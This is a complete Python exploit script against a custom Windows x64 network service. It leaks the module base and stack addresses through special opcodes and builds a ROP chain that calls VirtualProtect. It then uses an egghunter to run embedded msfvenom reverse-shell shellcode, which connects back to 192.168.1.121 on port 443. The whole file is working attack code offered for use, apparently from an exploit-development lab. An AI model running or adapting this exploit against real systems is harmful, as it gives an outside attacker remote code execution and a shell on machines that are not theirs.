#!/usr/bin/env python3

import socket
import sys
from struct import pack
from struct import unpack

# Egghunter Test/Build code: https://github.com/hvictor/egghunter-x64
egghunter = b"\x6a\x7f\x5f\x48\xff\xc7\x41\xb1\x40\x5e\x5e\x57\x54\x5a\x6a\x10\x54\x41\x58\x48\x89\x62\x20\x49\xff\xca\x6a\x50\x58\x0f\x05\x3c\x01\x7d\xe0\xb8\x62\x30\x30\x62\xaf\x75\xd8\xaf\x75\xd5\xff\xe7"

# Shellcode: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.121 LPORT=443 -b "\x00" -f py -v shellcode EXITFUNC=thread
shellcode  = b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x1b\x8d\xea"
shellcode += b"\x63\xb3\xae\x62\xde\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xe7\xc5\x69\x87\x43"
shellcode += b"\x46\xa2\xde\x1b\x8d\xab\x32\xf2\xfe\x30\x8f"
shellcode += b"\x4d\xc5\xdb\xb1\xd6\xe6\xe9\x8c\x7b\xc5\x61"
shellcode += b"\x31\xab\xe6\xe9\x8c\x3b\xc5\x61\x11\xe3\xe6"
shellcode += b"\x6d\x69\x51\xc7\xa7\x52\x7a\xe6\x53\x1e\xb7"
shellcode += b"\xb1\x8b\x1f\xb1\x82\x42\x9f\xda\x44\xe7\x22"
shellcode += b"\xb2\x6f\x80\x33\x49\xcc\xbb\x2b\x38\xfc\x42"
shellcode += b"\x55\x59\xb1\xa2\x62\x63\x25\xe2\x56\x1b\x8d"
shellcode += b"\xea\x2b\x36\x6e\x16\xb9\x53\x8c\x3a\x33\x38"
shellcode += b"\xe6\x7a\x9a\x90\xcd\xca\x2a\xb2\x7e\x81\x88"
shellcode += b"\x53\x72\x23\x22\x38\x9a\xea\x96\x1a\x5b\xa7"
shellcode += b"\x52\x7a\xe6\x53\x1e\xb7\xcc\x2b\xaa\xbe\xef"
shellcode += b"\x63\x1f\x23\x6d\x9f\x92\xff\xad\x2e\xfa\x13"
shellcode += b"\xc8\xd3\xb2\xc6\x76\x3a\x9a\x90\xcd\xce\x2a"
shellcode += b"\xb2\x7e\x04\x9f\x90\x81\xa2\x27\x38\xee\x7e"
shellcode += b"\x97\x1a\x5d\xab\xe8\xb7\x26\x2a\xdf\xcb\xcc"
shellcode += b"\xb2\x22\xeb\xf0\x3b\x84\x5a\xd5\xab\x3a\xf2"
shellcode += b"\xf4\x2a\x5d\xf7\xad\xab\x31\x4c\x4e\x3a\x9f"
shellcode += b"\x42\xd7\xa2\xe8\xa1\x47\x35\x21\xe4\x72\xb7"
shellcode += b"\x2a\x0d\xd9\x11\xec\x44\xbe\xd8\x63\xb3\xef"
shellcode += b"\x34\x97\x92\x6b\xa2\xe2\x5f\x0e\x63\xde\x1b"
shellcode += b"\xc4\x63\x86\xfa\x12\x60\xde\x1a\x36\x2a\xcb"
shellcode += b"\xb2\xd7\x23\x8a\x52\x04\x0e\x2f\x3a\x5f\x23"
shellcode += b"\x64\x57\xfa\xcc\x64\x4c\x7b\x2e\x57\xf1\xe5"
shellcode += b"\xeb\x62\xb3\xae\x3b\x9f\xa1\xa4\x6a\x08\xb3"
shellcode += b"\x51\xb7\x8e\x4b\xc0\xdb\xaa\xfe\x9f\xa2\x96"
shellcode += b"\xe4\x4d\xa2\xea\x71\xe6\x9d\x1e\x53\x04\x2b"
shellcode += b"\x22\x09\x44\x6d\x01\xfb\x72\x3f\x2b\x3a\x69"
shellcode += b"\x08\xce\x5a\xd5\xa6\xea\x51\xe6\xeb\x27\x5a"
shellcode += b"\x37\x73\xc6\xc7\xcf\x9d\x0b\x53\x0c\x2e\x23"
shellcode += b"\xb1\xae\x62\x97\xa3\xee\x87\x07\xb3\xae\x62"
shellcode += b"\xde\x1b\xcc\xba\x22\xe3\xe6\xeb\x3c\x4c\xda"
shellcode += b"\xbd\x2e\x82\x6e\x08\xd3\x42\xcc\xba\x81\x4f"
shellcode += b"\xc8\xa5\x9a\x3f\xd9\xeb\x62\xfb\x23\x26\xfa"
shellcode += b"\x03\x4b\xea\x0b\xfb\x27\x84\x88\x4b\xcc\xba"
shellcode += b"\x22\xe3\xef\x32\x97\xe4\x4d\xab\x33\xfa\x51"
shellcode += b"\xaa\x93\x92\x4c\xa6\xea\x72\xef\xd8\xa7\xd7"
shellcode += b"\xb2\x6c\x9c\x66\xe6\x53\x0c\x53\x72\x20\xe8"
shellcode += b"\xbd\xef\xd8\xd6\x9c\x90\x8a\x9c\x66\x15\x82"
shellcode += b"\xc3\x31\x87\xab\xd9\x15\x3b\xdf\x43\xe4\x58"
shellcode += b"\xa2\xe0\x77\x86\x5e\xd8\x67\x87\x6a\x98\x53"
shellcode += b"\xdb\x67\x65\x5c\x9e\x98\x0c\xd9\xae\x3b\x9f"
shellcode += b"\x92\x57\x15\xb6\xb3\xae\x62\xde"

# Function to generate and send attack buffer for opcode 0x1
def attack_opcode_0x1(sock):
    print("Attacking with opcode 0x1...")
    
    # Prepare the attack buffer
    total_length = 1000
    xor_val = 0xdeadbeef

    # Create the buffer: first 8 bytes (total length XOR xor_val), xor_val, opcode, data
    buffer = pack('<II', (total_length ^ xor_val), xor_val)  # First 2 DWORDs: total_length and xor_val
    buffer += pack('<I', 0x1)  # Add the opcode (0x1)
    data = b'A' * (total_length - 12)
    buffer += data  # Append the data to the buffer

    # Send the buffer
    sock.sendall(buffer)
    print(f"Sent {len(buffer)} bytes")

# Function to attack with opcode 0x2
def attack_opcode_0x2(sock, dllBase, addrOfReturnAddress, addrToOverwrite):
    print("Attacking with opcode 0x2...")

    iatAddrVP = dllBase + 0x9308            # IAT Address where the VMA of VP is stored
    outputAddr = dllBase + 0x40d0           # Writable unused address right after the end of .data

    vp  = pack('<Q', 0x4545454545454545)    # VMA of VirtualProtect (to patch)
    vp += pack('<Q', 0x4646464646464646)    # Return Address from VirtualProtect (to patch)

    rop  = pack('<Q', dllBase + 0x1b3a)     # push rsp ; pop rcx ; ret ;
    rop += pack('<Q', dllBase + 0x243c)     # pop rax ; ret ;
    rop += pack('<Q', iatAddrVP)            # VMA of IAT location containing VP's VMA
    rop += pack('<Q', dllBase + 0x1b3d)     # mov rax, qword [rax] ; ret ; -> RAX = VMA of VP
    rop += pack('<Q', dllBase + 0x1b68)     # mov r10, rax ; ret ; -> R10 = VMA of VP
    rop += pack('<Q', dllBase + 0x1b41)     # pop rbx ; ret ;
    rop += pack('<Q', 0xfffffffffffffe90)   # -304 = offset to Shellcode 
    rop += pack('<Q', dllBase + 0x1b5b)     # sub rcx, rbx ; ret ; -> RCX = Shellcode Addr
    rop += pack('<Q', dllBase + 0x1b63)     # xchg rax, rcx ; push rax ; pop rcx ; ret ; -> RAX = Shellcode Addr
    rop += pack('<Q', dllBase + 0x1b6c)     # mov r11, rax ; ret ; -> R11 = lpAddress = Shellcode Addr 
    rop += pack('<Q', dllBase + 0x1b41)     # pop rbx ; ret ;
    rop += pack('<Q', 0xfffffffffffffce0)   # -800
    rop += pack('<Q', dllBase + 0x1b53)     # neg rbx ; ret ; -> RBX = 800
    rop += pack('<Q', dllBase + 0x1b47)     # mov rdx, rbx ; ret ; -> RDX = dwSize = 800
    rop += pack('<Q', dllBase + 0x1b41)     # pop rbx ; ret ;
    rop += pack('<Q', 0xffffffffffffffc0)   # -0x40
    rop += pack('<Q', dllBase + 0x1b53)     # neg rbx ; ret ; -> RBX = 0x40
    rop += pack('<Q', dllBase + 0x1b4b)     # mov r8, rbx ; ret ; -> R8 = flNewProtect = 0x40
    rop += pack('<Q', dllBase + 0x1b41)     # pop rbx ; ret ;
    rop += pack('<Q', outputAddr)           # Writable unused address
    rop += pack('<Q', dllBase + 0x1b4f)     # mov r9, rbx ; ret ; -> rR9 = lpflOldProtect
    rop += pack('<Q', dllBase + 0x1b3a)     # push rsp ; pop rcx ; ret ;
    rop += pack('<Q', dllBase + 0x1b41)     # pop rbx ; ret ;
    rop += pack('<Q', 0xffffffffffffff40)   # -192 = offset to VP Skeleton
    rop += pack('<Q', dllBase + 0x1b57)     # add rcx, rbx ; ret ; -> RCX = VP Skeleton
    rop += pack('<Q', dllBase + 0x1b63)     # xchg rax, rcx ; push rax ; pop rcx ; ret ; -> RAX = VP Skeleton
    rop += pack('<Q', dllBase + 0x1b78)     # mov rcx, r10 ; ret ; -> RCX = VMA of VP
    rop += pack('<Q', dllBase + 0x1b5f)     # mov qword [rax], rcx ; ret ; -> Patch VMA of VP
    rop += pack('<Q', dllBase + 0x1b80)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b80)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b80)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b80)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b80)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b80)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b80)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b80)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b7c)     # mov rcx, r11 ; ret ; -> RCX = Return Addr = Shellcode Addr
    rop += pack('<Q', dllBase + 0x1b5f)     # mov qword [rax], rcx ; ret ; -> Patch Return Addr of VP 
    rop += pack('<Q', dllBase + 0x1b84)     # dec rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b84)     # dec rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b84)     # dec rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b84)     # dec rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b84)     # dec rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b84)     # dec rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b84)     # dec rax ; ret ;
    rop += pack('<Q', dllBase + 0x1b84)     # dec rax ; ret ; -> RAX = VP Skeleton
    rop += pack('<Q', dllBase + 0x1b88)     # xchg rax, rsp ; ret ;

    # Prepare the attack buffer
    total_length = 2000
    xor_val = 0xbecabeca

    # Create the buffer: first 8 bytes (total length XOR xor_val), xor_val, opcode, data
    buffer = pack('<II', (total_length ^ xor_val), xor_val)  # First 2 DWORDs: total_length and xor_val
    buffer += pack('<I', 0x2)  # Add the opcode (0x2)

    # 4 bytes = (Total Len) ^ (XOR value)
    # 4 bytes = (XOR value)
    # 4 bytes = Opcode
    # 8 bytes = Write dest. address
    # 8 bytes = Value to write at dest. address
    # 500 bytes = ROP chain + x64 egghunter
    # 8 bytes = egg
    nop_sled_len = (total_length - 12 - 16 - 500 - 8 - len(shellcode))
    
    data = pack('<Q', addrOfReturnAddress) + pack('<Q', addrToOverwrite) + vp + rop + egghunter + b"\x90" * (500 - len(egghunter) - len(vp) - len(rop)) + b"b00bb00b" + b'\x90' * nop_sled_len + shellcode
    buffer += data  # Append the data to the buffer

    # Send the buffer
    sock.sendall(buffer)
    print(f"Sent {len(buffer)} bytes")

# Opcode 0x3: Leak a stack address of the client-handling thread. This is the address of the client-socket.
# The client socket is saved on the thread's stack, and its distance from the Return Address is fixed and is 104 bytes.
def attack_opcode_0x3(sock):
    print("Attacking with opcode 0x3...")

    # Prepare the attack buffer
    total_length = 100
    xor_val = 0xbecabeca

    # Create the buffer: first 8 bytes (total length XOR xor_val), xor_val, opcode, data
    buffer = pack('<II', (total_length ^ xor_val), xor_val)  # First 2 DWORDs: total_length and xor_val
    buffer += pack('<I', 0x3)  # Add the opcode (0x3)

    data = b'A' * (total_length - 12)
    buffer += data  # Append the data to the buffer

    # Send the buffer
    sock.sendall(buffer)

    response = sock.recv(8)
    addr = unpack('<Q', response)[0]
    return addr

# Opcode 0x99: Leak the Function Base, a global pointer in the targetserv module
def attack_opcode_0x99(sock):
    print("Attacking with opcode 0x99...")

    # Prepare the attack buffer
    total_length = 100
    xor_val = 0xcacafece

    # Create the buffer: first 8 bytes (total length XOR xor_val), xor_val, opcode, data
    buffer = pack('<II', (total_length ^ xor_val), xor_val)  # First 2 DWORDs: total_length and xor_val
    buffer += pack('<I', 0x99)  # Add the opcode (0x99)

    data = b'A' * (total_length - 12)
    buffer += data  # Append the data to the buffer

    # Send the buffer
    sock.sendall(buffer)

    response = sock.recv(8)
    addr = unpack('<Q', response)[0]
    dllBase = addr - 16384
    return dllBase

# Main function to handle connection and execute attack
def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    # Create a socket and connect to the server
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    dllBase = attack_opcode_0x99(sock)
    threadStackAddr = attack_opcode_0x3(sock)
    addrOfThreadRetAddr = threadStackAddr - 104

    print(f"Targetserv Base Address: 0x{dllBase:016x}")
    print(f"Leaked thread-stack address: 0x{threadStackAddr:016x}")
    print(f"Target Return Address stored at: 0x{addrOfThreadRetAddr:016x}")

    addrToOverwrite = dllBase + 0x1b8b  # sub rsp, 0x230 ; ret ;
    attack_opcode_0x2(sock, dllBase, addrOfThreadRetAddr, addrToOverwrite)

    sock.close()

if __name__ == "__main__":
    main()
